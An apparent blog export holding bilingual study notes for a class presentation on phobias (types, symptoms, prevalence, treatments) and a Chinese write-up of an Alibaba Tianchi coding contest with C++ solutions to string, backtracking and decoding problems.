<p>The key components of a phobia are typically the fact that it is unreasonable and that it has a direct impact on a person’s quality of life.Someone who feels fear and panic when confronted by a person holding a weapon in a threatening way is not experiencing a phobia.This response of anxiety is perfectly reasonable,since the person is encountering a situation that may result in bodily harm or death. Someone experiencing a similar level of anxiety, perhaps accompanied by quickened breathing and heartbeat and a general sense of panic, when confronted by a common spider is experiencing a phobia, as this reaction is fairly unreasonable.</p>
<p>恐惧症的关键部分通常是恐惧的产生是不合理的没有原因的而且恐惧还必须对人们的生活质量有直接影响。因为被人用武器威胁的方式感到恐惧和恐慌这不是在经历恐惧症。焦虑的产生必须是完全无理由的，不能是因为遭遇可能会导致身体受伤或死亡的状况所产生的恐惧。经历相同水平的焦虑可能会伴随着呼吸加快心跳、呼吸加快和恐慌，一只普通的蜘蛛所带来的焦虑是恐惧症，因为这个反应相当没有理由。</p>
<p>A phobia also has a direct and negative impact on a person’s life and ability to function.If someone suffers a server fear of the word “heliotrope”,this would likely not be diagnosed as a mental illness since it is unlikely that this fear would directly impact that person’s well-being.An intense fear of water, on the other hand,may be grounds for a diagnosis, as this can impact a person’s ability to bathe, go outside during a rainstorm, and even enjoy a glass of water.</p>
<p>恐惧症对人们的生活和个人能力也有直接和消极的影响。如果某个人对单词“heliotrope”有严重的恐惧，这很可能会被诊断为精神疾病因为这个恐惧不可能直接影响人的幸福。在另一方面，对水的强烈恐惧可能是诊断依据，因为这可以影响一个人洗澡，雨天外出，甚至还有喝水。</p>
<h5 id="The-classification-of-phobia"><a href="#The-classification-of-phobia" class="headerlink" title="The  classification of phobia."></a>The  classification of phobia.</h5><p>There are generally three basic types of fears that are the grounds for a number of different types of fears. <strong>Social phobia</strong> is an intense fear of social situations and other people. It usually manifests in either generalized or specific forms. The generalized form is a basic fear of social situations and meeting new people, while specific forms often indicate one particular aspect of social interaction that triggers the panic response.</p>
<p>通常有三种基本的恐惧，其他大量不同类型的恐惧都以这三种为基础。社交恐惧症是一个对社会的状况和其他人的强烈的恐惧。它通常表现为一般形式或具体形式。一般形式是对社交场景和与陌生人见面的基本恐惧，而具体形式经常指某一个特定的触发恐慌的社会活动。</p>
<p><strong>Agoraphobia</strong> is a basic type of fear that incorporates a number of different triggers that cause anxiety and panic. These different triggers create a composite fear of leaving the home or going outside.This can include certain aspects of social phobia and fear responses to other stimuli,but ultimately results in a person’s inability to leave his or her home or other place he or she feels safe.</p>
<p>广场恐惧症是一种基础的恐惧，它包含了大量的不同的可能导致焦虑和恐慌的因素。这些不同的因素产生了离开家或外出时的混合恐惧。这可能包括社交恐惧症的部分方面以及对其他刺激的恐惧反应，最终导致一个人无法离开家或他/她感到安全的地方。</p>
<p>There are also <strong>specific phobias</strong> that all refer to individual fears of different things. <strong>Hydrophobia</strong>,for example,is a fear of water, ofter tied to a traumatic experience such as nearly drowning as a child, while <strong>arachnophobia</strong> is an intense fear of spiders. There different phobias can affect people in different ways, but are generally tied to a particular stimulus that triggers the panic or fear response.</p>
<p>也有一些特定恐惧症，是对不同事物的个人恐惧。例如，恐水症就是对水的恐惧，这和创伤性的经历比如小时候溺过水有关，蜘蛛恐惧症是一种对蜘蛛的强烈恐惧。这些不同的恐惧通过不同的方式影响着人么，但是它们通常依赖于某些触发恐慌或恐惧反应的特定刺激。</p>
<h5 id="The-causes-of-phobias"><a href="#The-causes-of-phobias" class="headerlink" title="The causes of phobias?"></a>The causes of phobias?</h5><h5 id="What-is-phobia"><a href="#What-is-phobia" class="headerlink" title="What is phobia?"></a>What is phobia?</h5><p>A phobia is an irrational fear,a kind of anxiety disorder in which the sufferer has a rentless dread of a situation,living creature,place or thing.</p>
<p>phobias are the most common kind of anxiety disorder in the industrial nations:</p>
<ul>
<li>Over 50 million people in the USA and 10 million in the UK are thought to live with a phobia.</li>
<li>Between 8.7% and 18.1% of Americans of all ages suffer from phobias.</li>
</ul>
<h5 id="Phobia-Symptoms"><a href="#Phobia-Symptoms" class="headerlink" title="Phobia Symptoms."></a>Phobia Symptoms.</h5><p><a href="https://adaa.org/understanding-anxiety/specific-phobias/symptoms">Phobic symptoms</a> can occur through exposure to the feared object or situation, or sometimes merely through thinking about the feared object. Typical symptoms associated with phobias include:</p>
<ul>
<li>Breathlessness</li>
<li>Dizziness, trembling, and increased heart rate</li>
<li>Fear of dying</li>
<li>Nausea</li>
<li>Preoccupation with the feared object</li>
<li>A sense of unreality</li>
</ul>
<p>In some cases, these symptoms may escalate into a full-scale <a href="https://www.verywellmind.com/what-is-an-anxiety-attack-2584253">anxiety attack</a>.</p>
<p>In response to these symptoms, some individuals may develop social anxiety disorder (SAD)—previously known as social phobia—and begin to isolate themselves, leading to severe difficulties with functioning in daily life and with maintaining relationships.</p>
<p>In other cases, <a href="https://www.verywellmind.com/hypochondriasis-2671689">such as with hypochondriasis</a>, a person may seek out medical care due to a constant concern with imagined illnesses or imminent death.</p>
<h5 id="Types-of-Phobias"><a href="#Types-of-Phobias" class="headerlink" title="Types of Phobias."></a>Types of Phobias.</h5><p>The <a href="https://www.psychiatry.org/patients-families/anxiety-disorders/what-are-anxiety-disorders">American Psychiatric Association defines phobias as anxiety disorders</a> and categorizes them into three different types:</p>
<ul>
<li><a href="https://www.verywellmind.com/agoraphobia-101-2584235"><strong>Agoraphobia</strong></a>: This describes a fear of being trapped in an inescapable place or situation. As a result, the phobic individual may begin to avoid such situations. In some cases, this fear can become so pervasive and overwhelming that the individual even fears to leave their home.</li>
<li><strong>Specific phobias</strong>: These involve the fear of a particular object (such as snakes or <a href="https://www.verywellmind.com/what-is-the-fear-of-butterflies-and-moths-2671884">butterflies and moths</a>). Such phobias typically fall into one of four different categories: situational, animals, medical, or environmental. A few examples of <a href="https://www.verywellmind.com/most-common-phobias-4136563">common fear objects </a>include spiders, dogs, needles, natural disasters, heights, and flying.</li>
<li><strong>Social phobias</strong>: A fear of social situations includes an extreme and pervasive fear of social situations. In some cases, this fear may center on a very particular type of social situation such as public speaking. In other instances, people may fear to perform any task in front of other people for fear that they will be somehow publicly embarrassed.</li>
</ul>
<p>More examples of the four major types of specific phobias﻿ include:</p>
<ul>
<li><strong>Animal</strong>: Fear of snakes, rodents, cats, or birds.</li>
<li><strong>Medical</strong>: Fear of seeing blood or visiting a doctor.</li>
<li><strong>Natural environment</strong>: Fear of lightning, water, storms, hurricanes, tornadoes, or mudslides.</li>
<li><strong>Situational</strong>: Fear of bridges, leaving home, or driving.</li>
</ul>
<h5 id="Prevalence-of-Social-Anxiety-Disorder"><a href="#Prevalence-of-Social-Anxiety-Disorder" class="headerlink" title="Prevalence of Social Anxiety Disorder"></a>Prevalence of Social Anxiety Disorder</h5><p>According to the National Institute of Mental Health, social anxiety disorder <a href="https://www.nimh.nih.gov/health/publications/social-anxiety-disorder-more-than-just-shyness/index.shtml">affects about 7% of adult Americans in a given year</a> and specific phobias <a href="https://www.nimh.nih.gov/health/statistics/specific-phobia.shtml">affect approximately 9%</a>. In general, women are affected more than men.</p>
<p>According to the <a href="https://www.verywellmind.com/the-diagnostic-and-statistical-manual-dsm-2795758"><em>Diagnostic and Statistical Manual of Mental Disorders</em></a>, only about 10% of reported phobia cases become life-long phobias.</p>
<h5 id="Phobia-Treatments"><a href="#Phobia-Treatments" class="headerlink" title="Phobia Treatments."></a>Phobia Treatments.</h5><p>There are <a href="https://www.verywellmind.com/treatment-options-for-phobias-2672022">a number of treatment approaches for phobias</a>, and the effectiveness of each approach depends on the person and their type of phobia. </p>
<p>In exposure treatments,the person is strategically exposed to their feared object in order to help them overcome their fear. One type of exposure treatment is flooding, in which the patient is confronted by the feared object for an extended length of time without the opportunity to escape. The goal of this method is to help the individual face their fear and realize that the feared object will not harm them.</p>
<p>Another method often used in phobia treatment is counter-conditioning. In this method, the person is taught a new response to the feared object. Rather than panic in the face of the feared object or situation, the person learns <a href="https://www.verywellmind.com/relaxation-techniques-for-sad-3024334">relaxation techniques</a> to replace anxiety and fear.</p>
<p>This new behavior is incompatible with the previous panic response, so the phobic response gradually diminishes. Counter-conditioning is often used with people who are unable to handle exposure treatments and has been effective for treating children and adolescents.</p>
<p>Finally, for both adults and children with social phobia, medication like a low dose of a <a href="https://www.verywellmind.com/the-benzodiazepines-378909">benzodiazepine</a> or potentially an antidepressant (like a selective serotonin reuptake inhibitor, or SSRI) in combination with cognitive-behavioral therapy can prove helpful.</p>
<h5 id="A-Word-From-Verywell"><a href="#A-Word-From-Verywell" class="headerlink" title="A Word From Verywell"></a>A Word From Verywell</h5><p>If you think you may have a phobia, please seek out treatment from a licensed therapist, psychologist, or psychiatrist. You deserve to develop control of this fear, and you can with proper therapy. </p>
<p>Good morning ,my name is zww.Today,the topic I’m going to talk about is high anxiety:phobias.I will introduce it from the following four aspects.</p>
<p>p5:Ok,let’s go on.</p>
<p>OK，that’s all,thanks for your listening.</p>
<p><a href="/video/Phobia">ppt插入视频</a></p>
<h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><p><a href="https://www.zhizuotu.com/buttonColor">去底色</a></p>
<p><a href="https://bigjpg.com/">AI人工智能图片放大</a></p>
<p><a href="https://www.gaitubao.com/">改图宝修改图片尺寸</a></p>
<p><a href>恐惧症举例（动图）</a></p>
<p><a href="https://www.youtube.com/watch?v=jYA9CHX1NLU&amp;feature=youtu.be">插入视频</a>（科学上网）</p>
<p><a href="https://en.savefrom.net/18/">youtube视频下载</a></p>
<p><a href="https://wenku.baidu.com/view/a77d9c81cec789eb172ded630b1c59eef9c79a79">high anxiety:phobia ppt百度文库付费</a></p>
<p><a href="https://www.nhs.uk/conditions/phobias/treatment/">treatment视频</a></p>
]]></content>
      <categories>
        <category>课程</category>
      </categories>
  </entry>
  <entry>
    <title>编程battle-精神小伙场</title>
    <url>/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本次是阿里云天池平台上的在线编程battle赛，详细信息如下</p>
<p><strong>比赛地址：</strong></p>
<p><a href="https://tianchi.aliyun.com/oj/141733967030952298?spm=5176.15098393.J_6210563800.4.450a5cd646REpt">【精神小伙场】水一波礼品队</a><br><a href="https://tianchi.aliyun.com/oj/140269389066823835?spm=5176.15098393.J_6210563800.2.450a5cd646REpt">【精神小伙场】次次AC队</a></p>
<p><strong>活动规则：</strong></p>
<p>1、参赛者将与对手【次次AC队】进行较量，答出一题即可上榜，上榜人数多的一方取得胜利并瓜分【精神小伙场】所含34万积分 (可在天池兑换各种丰厚奖品）。 2、请在10月24日下午20：00-22：00期间答题，比赛结束后可以答题但不计入排行榜。 3、排行榜采用ACM赛制，总用时为罚时+答题时间总和。排行榜每2分钟更新1次，22点显示排行榜最终结果。 4、代码中请勿包含任何个人信息、账号、口令等信息，以免造成泄漏。 5、比赛答疑和交流欢迎加入钉钉群：35215271 6、积分会在5个工作日内自动发放至个人账号</p>
<p><strong>奖品设置：</strong></p>
<p>获胜一方上榜选手均分34万积分（天池粮票） 粮票兑换奖品链接：<a href="https://tianchi.aliyun.com/home/souvenir">https://tianchi.aliyun.com/home/souvenir</a></p>
<a id="more"></a>
<p><strong>参赛题目：</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>题目</th>
<th>难度</th>
<th>通过率</th>
<th>状态</th>
</tr>
</thead>
<tbody>
<tr>
<td>1.笛卡尔积</td>
<td>中等</td>
<td>91%</td>
<td><img src="https://img.alicdn.com/tfs/TB1TzBYNfb2gK0jSZK9XXaEgFXa-40-40.png" alt="img"></td>
</tr>
<tr>
<td>2.解码方式</td>
<td>困难</td>
<td>67%</td>
<td><img src="https://img.alicdn.com/tfs/TB1TzBYNfb2gK0jSZK9XXaEgFXa-40-40.png" alt="img"></td>
</tr>
<tr>
<td>3.数字消除</td>
<td>简单</td>
<td>28%</td>
<td><img src="https://img.alicdn.com/tfs/TB1xubla3gP7K4jSZFqXXamhVXa-40-40.png" alt="img"></td>
</tr>
<tr>
<td>4.连接两个字符串中的不同字符</td>
<td>简单</td>
<td>71%</td>
<td><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/TB1xubla3gP7K4jSZFqXXamhVXa-40-40.png" alt="img"></td>
</tr>
</tbody>
</table>
</div>
<p>我是作为“水一波礼品队”参加的，下面是本次比赛的做题过程及题解分析，仅此记录学习一下</p>
<h6 id="连接两个字符串中的不同字符"><a href="#连接两个字符串中的不同字符" class="headerlink" title="连接两个字符串中的不同字符"></a>连接两个字符串中的不同字符</h6><p><strong>题目描述：</strong></p>
<p>给出两个字符串, 你需要修改第一个字符串，将所有与第二个字符串中相同的字符删除, 并且第二个字符串中不同的字符与第一个字符串的不同字符连接</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">样例 <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输入 : s1 = <span class="string">&quot;aacdb&quot;</span>, s2 = <span class="string">&quot;gafd&quot;</span></span><br><span class="line">输出 : <span class="string">&quot;cbgf&quot;</span></span><br><span class="line"></span><br><span class="line">样例 <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输入 : <span class="string">&quot;abcs&quot;</span>, s2 = <span class="string">&quot;cxzca&quot;</span></span><br><span class="line">输出 : <span class="string">&quot;bsxz&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>思路：</strong>先遍历s1中的字符判断是否在s2中，如果不在就添加到最后结果中；然后同理再遍历s2</p>
<p><strong>代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @param s1: the 1st string</span></span><br><span class="line"><span class="comment">     * @param s2: the 2nd string</span></span><br><span class="line"><span class="comment">     * @return: uncommon characters of given strings</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">concatenetedString</span><span class="params">(<span class="built_in">string</span> &amp;s1, <span class="built_in">string</span> &amp;s2)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// write your code here</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//存储最后结果</span></span><br><span class="line">    <span class="built_in">string</span> result=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">//遍历查找s1中的不在s2中的字符</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;s1.length();i++)&#123;</span><br><span class="line">        <span class="comment">//遍历查找字符串s2是否包含子串s1中的字符,其中string:npos是个特殊值，说明查找没有匹配</span></span><br><span class="line">        <span class="keyword">if</span>(s2.find(s1[i])==<span class="built_in">string</span>::npos)&#123;</span><br><span class="line">            <span class="comment">//如果s2中不含当前s1中的字符，则添加到result中</span></span><br><span class="line">            result+=s1[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//同理，找到s2中的不在s1中的字符</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;s2.length();i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s1.find(s2[i])==<span class="built_in">string</span>::npos)&#123;</span><br><span class="line">            result+=s2[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h6 id="数字消除"><a href="#数字消除" class="headerlink" title="数字消除"></a>数字消除</h6><p><strong>题目描述：</strong></p>
<p>给定一个数字构成的字符串，如果连着两个数字都相同，则可以消除，消除后前部分和后部分会连在一起，可以继续进行消除，现在问你能消除几次？</p>
<p>$1 \leq len(s) \leq 1000000$</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Example <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Input: <span class="string">&quot;43211234&quot;</span></span><br><span class="line">Output: <span class="number">4</span></span><br><span class="line"></span><br><span class="line">Example <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Input: <span class="string">&quot;101&quot;</span></span><br><span class="line">Output: <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>思路：</strong>遍历字符串，判断当前字符与下一位置字符是否相同，相同则使用earse函数删除相同的这两个字符，然后回退到上一个字符进行判断。注意特殊情况前两个字符相同时不进行回退。</p>
<p><strong>代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @param Numbers: a string of Numbers</span></span><br><span class="line"><span class="comment">     * @return: returns the number of eliminations</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">NumberOfErasures</span><span class="params">(<span class="built_in">string</span> &amp;Numbers)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write your code here.</span></span><br><span class="line">        <span class="comment">//记录消除次数</span></span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;Numbers.length();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(Numbers[i]==Numbers[i+<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="comment">//string erase函数删除从i开始的2个字符</span></span><br><span class="line">                Numbers.erase(i,<span class="number">2</span>);</span><br><span class="line">                result+=<span class="number">1</span>;</span><br><span class="line">                <span class="comment">//结束五分之后才改完这个错误提交成功，没计算成绩</span></span><br><span class="line">                <span class="comment">//特殊情况，前两个字符就匹配上的话要特殊处理</span></span><br><span class="line">                <span class="keyword">if</span>(i==<span class="number">0</span>)&#123;</span><br><span class="line">                    i-=<span class="number">1</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    i-=<span class="number">2</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h6 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h6><p><strong>题目描述：</strong></p>
<p>我们采用二维数组setList[][]表示集合数组，其中setList[i]中的每个元素都为整数，且不相同。求集合setList[0],setList[1],…,setList[setList.length - 1]的笛卡尔积。 一般地，集合A和集合B的笛卡尔积A×B = {(x,y)|x∈A∧y∈B}。</p>
<ul>
<li><code>1 &lt;= setList.length &lt;= 5</code></li>
<li><code>1 &lt;= setList[i].length &lt;= 5</code></li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">样例<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输入:</span><br><span class="line">setList = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>],[<span class="number">5</span>,<span class="number">6</span>]]</span><br><span class="line">输出: [[<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">1</span>,<span class="number">4</span>,<span class="number">6</span>],[<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>]]</span><br><span class="line">解释:</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]和[<span class="number">4</span>]和[<span class="number">5</span>,<span class="number">6</span>]的笛卡尔积为[[<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">1</span>,<span class="number">4</span>,<span class="number">6</span>],[<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>]]</span><br><span class="line"></span><br><span class="line">样例<span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输入:</span><br><span class="line">setList = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>]]</span><br><span class="line">输出: [[<span class="number">1</span>,<span class="number">4</span>],[<span class="number">2</span>,<span class="number">4</span>],[<span class="number">3</span>,<span class="number">4</span>]]</span><br><span class="line">解释:</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]和[<span class="number">4</span>]的笛卡尔积为[[<span class="number">1</span>,<span class="number">4</span>],[<span class="number">2</span>,<span class="number">4</span>],[<span class="number">3</span>,<span class="number">4</span>]]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>思路：</strong></p>
<p>这道题自己没做出来，本来是想遍历setList中的每个向量元素，有多少个向量元素就写多少个for循环，但是向量元素的个数不确定没办法写for循环不知道写几个，不过setListl.length&lt;=5,可以穷举出来所有的可能🤣可以用很多个for循环穷举（个数为2时2个for循环为3时3个for循环…也可以写5个for循环循环前添加判断条件，循环中用push_back(),pop_back(),这种循环其实就是回溯法），网上参考了别的资料，这道题是要用回溯求解，代码如下：</p>
<p><strong>回溯代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @param setList: The input set list</span></span><br><span class="line"><span class="comment">     * @return: the cartesian product of the set list</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//存储最后结果</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; ans;</span><br><span class="line">    <span class="comment">//存储最后结果中的一个元素</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; lv;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">getSet</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;setList)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//Write your code here</span></span><br><span class="line">        dfs(setList,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//DFS（深度优先搜索），回溯法</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;setList,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(i==setList.size())&#123;</span><br><span class="line">            ans.push_back(lv);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;setList[i].size();j++)&#123;</span><br><span class="line">            lv.push_back(setList[i][j]);</span><br><span class="line">            dfs(setList,i+<span class="number">1</span>);</span><br><span class="line">            lv.pop_back();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h6 id="解码方式"><a href="#解码方式" class="headerlink" title="解码方式"></a>解码方式</h6><p><strong>题目描述：</strong></p>
<p>使用以下映射方式将 A-Z 的消息编码为数字:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;A&#39; -&gt; 1</span><br><span class="line">&#39;B&#39; -&gt; 2</span><br><span class="line">...</span><br><span class="line">&#39;Z&#39; -&gt; 26</span><br></pre></td></tr></table></figure>
<p>除此之外, 编码的字符串也可以包含字符 <code>*</code>, 它代表了 1 到 9 的数字中的其中一个.给出包含数字和字符 <code>*</code> 的编码消息, 返回所有解码方式的数量. 因为结果可能很大, 所以结果需要对 10^9 + 7 取模</p>
<ul>
<li>输入的字符串在范围 [1, 10^5] 内.</li>
<li>输入的字符串只能包含字符 <code>*</code> 和数字 <code>0</code> - <code>9</code>.</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">样例<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输入: <span class="string">&quot;*&quot;</span></span><br><span class="line">输出: <span class="number">9</span></span><br><span class="line">说明: 你可以译码为 <span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;F&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;I&quot;</span>.</span><br><span class="line"></span><br><span class="line">样例<span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输入: <span class="string">&quot;1*&quot;</span></span><br><span class="line">输出: <span class="number">18</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>思路：</strong></p>
<p>这道题比赛时根本没时间看，后来看完一顿乱写，越写越迷，真的还是要有思路，不能是乱碰乱撞式写法，这道题比较复杂，是LeetCode上面的原题<a href="https://leetcode-cn.com/problems/decode-ways-ii">解码方法2</a>，还有一道相似的更基础版的题<a href="https://leetcode-cn.com/problems/decode-ways">解码方法</a></p>
<p>我现在太菜了😆，题解也看得似懂非懂，这道题确实也挺难的，就先把官方题解放在下面</p>
<p><strong>方法一：记忆性递归</strong><br><strong>算法</strong></p>
<p>对输入的字符序列，考虑每种可能的解码情况。</p>
<p>假设有函数 <code>ways(s,i)</code>，返回字符串 ss 中前 ii 个字符的解码方法数量。调用 <code>ways(s, s.length()-1)</code> 得到字符串中所有字符的解码方法数量。</p>
<p>我们从字符串 ss 的最后一个字符开始解码，假设此时调用函数 <code>ways(s,i)</code>。在 <code>ways(s,i)</code> 中计算前 i 个字符的所有解码方法数量。第 i 个字符有以下几种情况。</p>
<p>第 i 个字符是 <code>*</code>。首先考虑第$ i$ 个字符单独解码的情况，<code>*</code> 表示 1-9 中任意一个数字，对应 <code>A-I</code> 中任意一个字母。前 i 个字符的解码可以表示为在前 $i−1$ 个字符解码的结尾加上 <code>A-I</code> 中任意一个字母。因此总的解码数量为前$ n-1$个字符解码数量的 9 倍，即 <code>9*ways(s,i-1)</code>。</p>
<p>除此之外，第 $ i$  个字符也可以和第 $i−1$ 个字符一起解码。如果第$ i-1$  个字符是 <code>1</code>，它们可以表示 <code>11-19</code> 中任意一个数字，对应 <code>K-S</code> 中任意一个字母。前 $ i$  个字符的解码可以表示为在前 $i−2$ 个字符解码的结尾加上 <code>K-S</code> 中任意一个字母。因此总的解码数量为前$n−2$ 个字符解码数量的 9 倍，即 <code>9*ways(s,i-2)</code>。需要注意的是使用两个字符 <code>1*</code> 一起解码和两个字符分开单独解码的结果不重复。</p>
<p>如果第$i−1$ 个字符是 <code>2</code>，那么 <code>2*</code> 可以表示 <code>21-26</code> 中任意一个数字，对应 <code>U-Z</code> 中任意一个字母。总的解码数量是前$i−2$ 个字符解码数量的 6 倍，即 <code>6*ways(s,i-2)</code>。</p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways3.PNG" alt="解码方式"></p>
<p>如果第 $i−1$ 个字符是 <code>*，</code>那么<code>**</code> 可以表示 <code>11-19</code>（9）和 <code>21-26</code>（6） 中任意一个数字。因此总的解码数量是前 $i−2$ 个字符解码数量的 15（9+6） 倍，即 <code>15*ways(s,i-2)</code>。</p>
<p>如果第 $i$ 个字符是 <code>1-9</code> 的数字。首先考虑单个字符解码的情况。此时前 $i$ 个字符的解码数量等于前 $i-1$ 个字符的解码数量。如果第 $i$ 个字符是 <code>0</code>，那么它不能单独解码，必须与它的前一个字符一起解码。前一个字符是 <code>1</code>，<code>2</code> 或 <code>*</code> 时才可以解码。具体情况如下。</p>
<p>如果前一个字符是 <code>1</code>，那么它们可以是 <code>10-19</code> 中任意一个数字。此时解码数量等于前 $i-2$ 个字符的解码数量。</p>
<p>如果前一个字符是 <code>2</code>，则有效数字范围为 <code>20-26</code>。只有当前字符小于 7 时可以解码。此时解码数量等于前 $i−2$ 个字符的解码数量。</p>
<p>如果前一个字符是 <code>*</code>，那么解码数量取决于当前数字。如果当前数字大于 6，那么它们只能是 <code>17-19</code> 中任意一个（<code>27-29</code> 是无效的解码数字）。此时解码数量等于前$i−2$ 个字符的解码数量。</p>
